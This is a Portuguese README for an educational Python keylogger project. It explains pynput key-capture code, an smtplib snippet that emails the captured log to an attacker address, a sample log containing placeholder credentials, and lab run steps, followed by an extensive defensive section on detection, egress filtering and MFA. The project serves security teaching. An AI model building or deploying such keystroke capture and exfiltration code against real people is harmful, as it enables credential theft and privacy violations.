# 🐍 Simulando um Malware de Captura de Dados (Keylogger) em Python

Projeto prático e **educacional** que simula o funcionamento de um **keylogger** (malware de
captura de teclas) em **Python**, com o objetivo de entender, na prática, **como essa ameaça
funciona, como ela rouba dados e — principalmente — como detectá-la e se proteger**.

> ⚠️ **Aviso legal / Uso ético**
> Todo o código deste repositório é **estritamente educacional** e foi desenvolvido para rodar
> em um **ambiente 100% controlado** (a própria máquina / uma VM de laboratório), com
> consentimento. **Capturar dados de terceiros sem autorização é crime** no Brasil
> (Lei 12.737/2012 — "Lei Carolina Dieckmann") e viola a LGPD. Use este material **apenas**
> para aprendizado em segurança ofensiva e defensiva.

---

## 📑 Sumário

- [Objetivos de Aprendizagem](#-objetivos-de-aprendizagem)
- [Estrutura do Repositório](#-estrutura-do-repositório)
- [Como Funciona o `keylogger.py`](#-como-funciona-o-keyloggerpy)
- [O Arquivo `log.txt` (exemplos de retorno)](#-o-arquivo-logtxt-exemplos-de-retorno)
- [A Exfiltração por E-mail](#-a-exfiltração-por-e-mail)
- [Como Executar (laboratório)](#️-como-executar-laboratório)
- [🛡️ Reflexão sobre Defesa](#️-reflexão-sobre-defesa)
- [Lições Aprendidas](#-lições-aprendidas)
- [Referências](#-referências)

---

## 🎯 Objetivos de Aprendizagem

Ao concluir este desafio, fui capaz de:

- Compreender o funcionamento prático de um **keylogger** e de um **malware de captura de dados**;
- Identificar como esses malwares exploram **vulnerabilidades técnicas e brechas humanas**;
- Programar um script simples em **Python** simulando um ataque real em ambiente controlado;
- Entender o conceito de **exfiltração de dados** (como o dado "vaza" da vítima para o atacante);
- Refletir sobre **estratégias de defesa e prevenção** contra esse tipo de ameaça;
- Documentar os experimentos e usar o **GitHub** como portfólio técnico.

---

## 📁 Estrutura do Repositório

```
keylogger-dio/
├── README.md        # Esta documentação (explicação + reflexão sobre defesa)
├── keylogger.py     # O keylogger simulado (captura de teclas + exfiltração por e-mail)
└── log.txt          # Exemplo de arquivo de log gerado pela captura
```

| Arquivo | Descrição |
|---|---|
| [`README.md`](./README.md) | Documentação completa e reflexão defensiva |
| [`keylogger.py`](./keylogger.py) | Script que escuta o teclado e grava as teclas; opcionalmente envia o log por e-mail |
| [`log.txt`](./log.txt) | Saída de exemplo mostrando como as teclas capturadas ficam registradas |

---

## 🔍 Como Funciona o `keylogger.py`

O script usa a biblioteca **`pynput`**, que permite "escutar" eventos do teclado do sistema
operacional. A lógica é dividida em três partes:

### 1. Capturar cada tecla (`registrar_tecla`)

A cada tecla pressionada, a função grava o caractere no arquivo de log:

```python
def registrar_tecla(tecla):
    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
        try:
            f.write(tecla.char)          # tecla normal: letra, número, símbolo
        except AttributeError:
            if tecla == keyboard.Key.space:
                f.write(" ")             # barra de espaço vira um espaço
            elif tecla == keyboard.Key.enter:
                f.write("\n")            # Enter vira quebra de linha
            else:
                f.write(f"[{tecla}]")    # outras teclas: [Key.tab], [Key.shift]...
```

O `try/except` é o coração do keylogger: teclas comuns têm o atributo `.char` (a letra em si);
teclas **especiais** (Enter, Tab, Shift...) **não têm** e disparam o `AttributeError`, então são
registradas no formato `[Key.nome]`.

### 2. Escutar o teclado (`keyboard.Listener`)

O listener fica em execução contínua, chamando `registrar_tecla` a cada evento. A tecla **ESC**
encerra a captura (um freio de segurança para uso em laboratório):

```python
with keyboard.Listener(on_press=ao_pressionar) as listener:
    listener.join()
```

### 3. Exfiltrar os dados (`enviar_por_email`)

Opcionalmente, a cada lote de teclas o script envia o log para o e-mail do atacante
(ver seção dedicada abaixo).

> 🔒 **Escolhas de segurança deste código** (boas práticas para um projeto de estudo):
> - O envio por e-mail vem **desligado por padrão** (`ENVIAR_EMAIL = False`);
> - As credenciais são **placeholders** — sem preencher, o envio falha de propósito;
> - **Não há** técnicas de ocultação, persistência ou evasão de antivírus. É uma **demonstração
>   didática**, não uma ferramenta de ataque pronta para uso.

---

## 📄 O Arquivo `log.txt` (exemplos de retorno)

O keylogger grava as teclas **na ordem em que foram digitadas**. Exemplo de saída real:

```
===== Sessao iniciada: 2026-11-08 21:14:52 =====
isadora[Key.tab]1234[Key.enter]
minha familia se chama garcia
ta rolando uma briga na empresa
usuario[Key.tab]admin[Key.tab]P@ssw0rd123[Key.enter]
www.meubanco-exemplo.com.br[Key.enter]
cartao 1234[Key.space]5678[Key.space]9012[Key.space]3456[Key.enter]
[Key.esc]
===== Sessao encerrada: 2026-11-08 21:16:10 =====
```

**Como ler:**

| No log | O que significa |
|---|---|
| `isadora` | O usuário digitou literalmente essas letras |
| `[Key.tab]` | Pressionou **Tab** (ex.: pulou do campo de usuário para o de senha) |
| `[Key.enter]` | Pressionou **Enter** (enviou o formulário) |
| ` ` (espaço) | Barra de espaço |

> 💥 **O perigo em evidência:** em poucas linhas já "vazaram" **login, senha (`P@ssw0rd123`),
> dados bancários e informações pessoais**. É justamente por isso que estudamos o ataque — para
> reconhecer o risco e aplicar a **defesa**.

---

## 📧 A Exfiltração por E-mail

Capturar as teclas localmente é só **metade** do ataque. Para o atacante lucrar, o dado precisa
**sair da máquina da vítima** — isso se chama **exfiltração**. No projeto, isso é simulado com a
biblioteca `smtplib`:

```python
with smtplib.SMTP_SSL(SMTP_SERVIDOR, SMTP_PORTA) as servidor:
    servidor.login(EMAIL_ORIGEM, EMAIL_SENHA)
    servidor.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
```

O script lê o `log.txt` e o envia como corpo de um e-mail para o endereço do atacante, a cada
lote de teclas capturadas. **Esse é o ponto exato que as defesas de rede tentam flagrar**: uma
conexão SMTP inesperada partindo de um processo suspeito é um forte indicador de comprometimento
(IoC). Em um cenário real, o atacante poderia usar e-mail, um bot de Telegram, um servidor C2 ou
um webhook — o princípio é o mesmo: **transportar o dado roubado para fora**.

---

## ▶️ Como Executar (laboratório)

```bash
# 1. Instale a dependência
pip install pynput          # (ou: pipx install pynput / use um venv)

# 2. Rode o keylogger (ele grava em log.txt)
python keylogger.py

# 3. Digite algumas coisas para testar e pressione ESC para encerrar

# 4. Veja o que foi capturado
cat log.txt
```

Para **demonstrar a exfiltração** (somente em conta de teste sua): abra o `keylogger.py`, defina
`ENVIAR_EMAIL = True` e preencha as credenciais de uma conta de e-mail de laboratório (no Gmail,
use uma **"Senha de app"**).

---

## 🛡️ Reflexão sobre Defesa

Entender o ataque só tem valor se eu souber **neutralizá-lo**. Um keylogger explora tanto brechas
**técnicas** quanto **humanas** — e a defesa precisa cobrir as duas frentes.

### Como o keylogger chega até a vítima
Keyloggers raramente "aparecem do nada". Eles costumam entrar por:
- **Engenharia social / phishing** — anexos e links maliciosos (o elo mais explorado);
- **Software pirata / cracks** — instaladores adulterados;
- **Dispositivos USB** desconhecidos;
- **Downloads de fontes não confiáveis**.

### 🧰 Defesas técnicas

| Defesa | Como ajuda contra o keylogger |
|---|---|
| **Antivírus / EDR atualizado** | Detecta hooks de teclado e comportamento suspeito (assinatura + heurística) |
| **Firewall de saída (egress)** | Bloqueia a **exfiltração** — conexões SMTP/HTTP estranhas saindo da máquina |
| **Princípio do menor privilégio** | Usuário sem admin dificulta instalação e persistência do malware |
| **Atualizações (SO e apps)** | Fecha vulnerabilidades que o malware usaria para se instalar |
| **Sandboxing / máquinas virtuais** | Isola a execução de arquivos desconhecidos (teste antes de confiar) |
| **MFA / 2FA** | **Reduz o dano**: mesmo com a senha capturada, o atacante não acessa a conta |
| **Gerenciador de senhas + preenchimento automático** | Menos digitação manual de senhas = menos para o keylogger capturar |
| **Teclado virtual / monitoramento de integridade** | Camada extra em operações sensíveis (ex.: internet banking) |

### 🧠 Defesas humanas (conscientização)
A tecnologia sozinha não basta — a maioria dos ataques começa num **clique**:
- Desconfiar de **anexos e links** inesperados, mesmo de contatos conhecidos;
- **Não usar software pirata**;
- Baixar programas apenas de **fontes oficiais**;
- Treinar times para reconhecer **phishing** (simulações ajudam muito);
- Em caso de suspeita de infecção: **isolar a máquina da rede** e acionar a resposta a incidentes.

### 🔎 Sinais de alerta (detecção)
- Processos/desconhecidos consumindo CPU ou acessando o teclado;
- Conexões de rede de saída inesperadas (um `log.txt` sendo enviado por SMTP, por exemplo);
- Arquivos de log suspeitos aparecendo em pastas do usuário;
- Lentidão ou travamentos atípicos ao digitar.

> **Resumo da defesa:** combine **prevenção** (não deixar entrar), **detecção** (perceber cedo)
> e **mitigação** (MFA, menor privilégio e firewall de saída para reduzir o estrago). Nenhuma
> camada é perfeita sozinha — a segurança vem da **soma** delas (*defesa em profundidade*).

---

## 📝 Lições Aprendidas

- Um keylogger **simples** (poucas dezenas de linhas) já é capaz de roubar credenciais — por isso
  higiene digital básica importa tanto.
- **Captura ≠ ataque completo**: sem **exfiltração**, o dado não chega ao atacante — e é aí que o
  **firewall de saída** e o **EDR** têm a melhor chance de interromper o ataque.
- **MFA é o melhor amortecedor**: transforma uma senha vazada em um dano muito menor.
- Estudar a ofensiva me deixou **melhor na defensiva** — sei o que procurar e onde cortar a cadeia.

---

## 📚 Referências

- [pynput — Documentação](https://pynput.readthedocs.io/)
- [Python `smtplib` — Documentação](https://docs.python.org/3/library/smtplib.html)
- [OWASP — Keylogger](https://owasp.org/www-community/attacks/Keystroke_logging)
- [CISA — Phishing Guidance](https://www.cisa.gov/topics/cyber-threats-and-advisories/phishing)
- [Cartilha de Segurança — CERT.br](https://cartilha.cert.br/)
- [Lei nº 12.737/2012 (Crimes Cibernéticos)](http://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm)

---

*Projeto desenvolvido como parte da trilha de estudos em Cibersegurança.
Uso estritamente educacional, em ambiente de laboratório controlado e autorizado.*
